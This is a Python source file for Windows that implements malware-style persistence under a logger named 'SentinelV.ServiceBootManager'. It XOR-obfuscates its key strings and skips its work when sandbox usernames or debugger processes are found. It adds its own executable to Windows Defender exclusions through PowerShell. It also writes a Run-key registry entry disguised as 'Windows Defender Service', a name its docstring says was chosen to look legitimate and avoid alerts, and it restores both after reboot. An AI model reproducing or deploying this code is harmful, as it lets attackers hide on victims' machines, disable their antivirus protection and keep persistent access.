
import logging
import os
import subprocess
from getpass import getuser
from typing import Optional
from winreg import (
    DeleteValue,
    HKEY_LOCAL_MACHINE,
    KEY_SET_VALUE,
    OpenKey,
    QueryValueEx,
    REG_SZ,
    SetValueEx,
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SentinelV.ServiceBootManager")

_SANDBOX_INDICATORS = {
    "analyst",
    "sandbox",
    "malware",
    "cuckoo",
    "virus",
    "test",
    "virustotal",
    "sandboxie",
    "guest",
    "itor",
    "user",
}

_DEBUGGER_PROCESSES = {
    "wireshark.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "processhacker.exe",
    "ida64.exe",
    "ida.exe",
    "dnspy.exe",
    "procexp.exe",
}

_XOR_KEY = b'\x42'  # Simple XOR key for obfuscation

def _xor_obfuscate(data: str) -> bytes:
    return bytes(c ^ _XOR_KEY[0] for c in data.encode())

def _xor_deobfuscate(data: bytes) -> str:
    return bytes(c ^ _XOR_KEY[0] for c in data).decode()

_OBFUSCATED_STRINGS = {
    "run_key": _xor_obfuscate(r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "exclusion_cmd": _xor_obfuscate("Add-MpPreference -ExclusionPath '{}'"),
    "check_exclusion_cmd": _xor_obfuscate("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"),
}


def _running_processes() -> set[str]:
    try:
        output = subprocess.check_output(
            ["tasklist", "/NH"],
            text=True,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000,
        )
        processes = {line.split()[0].lower() for line in output.splitlines() if line.strip()}
        return processes
    except Exception:
        return set()


def is_sandboxed_environment(username: Optional[str] = None) -> bool:
    """Detecta entornos de laboratorio usando nombre de usuario y procesos de depuración."""
    username = (username or getuser()).lower()
    if any(indicator in username for indicator in _SANDBOX_INDICATORS):
        return True

    running = _running_processes()
    return any(debug_proc in running for debug_proc in _DEBUGGER_PROCESSES)


def add_defender_exclusion(executable_path: str) -> bool:
    """Add executable path to Windows Defender exclusions using PowerShell."""
    try:
        cmd = _xor_deobfuscate(_OBFUSCATED_STRINGS["exclusion_cmd"]).format(executable_path)
        result = subprocess.run(
            ["powershell", "-Command", cmd],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if result.returncode == 0:
            logger.info("Exclusión añadida a Windows Defender para %s", executable_path)
            return True
        else:
            logger.warning("Fallo al añadir exclusión: %s", result.stderr)
            return False
    except Exception as exc:
        logger.exception("Error al ejecutar PowerShell para exclusión: %s", exc)
        return False


def check_defender_exclusions() -> list[str]:
    """Check current Windows Defender exclusions."""
    try:
        cmd = _xor_deobfuscate(_OBFUSCATED_STRINGS["check_exclusion_cmd"])
        result = subprocess.run(
            ["powershell", "-Command", cmd],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if result.returncode == 0:
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        else:
            logger.warning("Fallo al verificar exclusiones: %s", result.stderr)
            return []
    except Exception as exc:
        logger.exception("Error al verificar exclusiones: %s", exc)
        return []


def verify_integrity(executable_path: str) -> bool:
    """Verify if persistence and exclusions are still active post-reboot."""
    exclusions = check_defender_exclusions()
    if executable_path not in exclusions:
        logger.warning("Exclusión perdida, intentando restaurar")
        add_defender_exclusion(executable_path)
    # Check registry
    run_key = _xor_deobfuscate(_OBFUSCATED_STRINGS["run_key"])
    try:
        with OpenKey(HKEY_LOCAL_MACHINE, run_key, 0, KEY_SET_VALUE) as key:
            value, _ = QueryValueEx(key, "Windows Defender Service")
            if value != executable_path:
                logger.warning("Entrada de registro perdida, intentando restaurar")
                SetValueEx(key, "Windows Defender Service", 0, REG_SZ, executable_path)
        return True
    except Exception:
        try:
            from winreg import HKEY_CURRENT_USER
            with OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_SET_VALUE) as key:
                value, _ = QueryValueEx(key, "Windows Defender Service")
                if value != executable_path:
                    SetValueEx(key, "Windows Defender Service", 0, REG_SZ, executable_path)
            return True
        except Exception as exc:
            logger.exception("Fallo al verificar integridad: %s", exc)
            return False


def cleanup_startup_entry(
    value_name: str = "Windows Defender Service",
    sandbox_check: bool = True,
) -> bool:
    """Elimina la entrada de persistencia previamente creada en HKCU Run."""
    if sandbox_check and is_sandboxed_environment():
        logger.warning("Entorno de análisis detectado. Limpieza de persistencia omitida para evitar ruido.")
        return False

    run_key = _xor_deobfuscate(_OBFUSCATED_STRINGS["run_key"])
    try:
        with OpenKey(HKEY_LOCAL_MACHINE, run_key, 0, KEY_SET_VALUE) as key:
            DeleteValue(key, value_name)
        logger.info("Entrada de persistencia limpiada en HKLM: %s", value_name)
        return True
    except FileNotFoundError:
        logger.info("La entrada de persistencia no existía en HKLM: %s", value_name)
        return False
    except PermissionError as exc:
        logger.warning("Permisos insuficientes para HKLM. Intentando HKCU: %s", exc)
        try:
            from winreg import HKEY_CURRENT_USER
            with OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_SET_VALUE) as key:
                DeleteValue(key, value_name)
            logger.info("Entrada de persistencia limpiada en HKCU (fallback): %s", value_name)
            return True
        except FileNotFoundError:
            logger.info("La entrada de persistencia no existía en HKCU: %s", value_name)
            return False
        except Exception as exc2:
            logger.warning("Fallo al limpiar en HKCU: %s", exc2)
            return False
    except OSError as exc:
        logger.exception("Error al eliminar entrada en registro HKLM: %s", exc)
        raise


def register_startup_entry(
    executable_path: str,
    value_name: str = "Windows Defender Service",
    sandbox_check: bool = True,
) -> bool:
    """Crea una entrada en HKCU Run para persistencia silenciosa.

    La entrada se nombra para parecer legítima y minimizar alertas básicas de análisis.
    """
    if sandbox_check and is_sandboxed_environment():
        logger.warning("Entorno de laboratorio detectado, se omite la persistencia")
        return False

    if not os.path.isfile(executable_path):
        raise FileNotFoundError(f"El ejecutable especificado no existe: {executable_path}")

    run_key = _xor_deobfuscate(_OBFUSCATED_STRINGS["run_key"])
    try:
        with OpenKey(HKEY_LOCAL_MACHINE, run_key, 0, KEY_SET_VALUE) as key:
            SetValueEx(key, value_name, 0, REG_SZ, executable_path)
        logger.info("Entrada de persistencia registrada como %s en HKLM", value_name)
        # Attempt to add Defender exclusion
        add_defender_exclusion(executable_path)
        return True
    except PermissionError as exc:
        logger.warning("Permisos insuficientes para HKLM. Intentando HKCU: %s", exc)
        try:
            from winreg import HKEY_CURRENT_USER
            with OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_SET_VALUE) as key:
                SetValueEx(key, value_name, 0, REG_SZ, executable_path)
            logger.info("Entrada de persistencia registrada como %s en HKCU (fallback)", value_name)
            return True
        except Exception as exc2:
            logger.warning("Fallo al registrar en HKCU: %s", exc2)
            return False
    except OSError as exc:
        logger.warning("Error al modificar el registro de Windows HKLM: %s", exc)
        return False
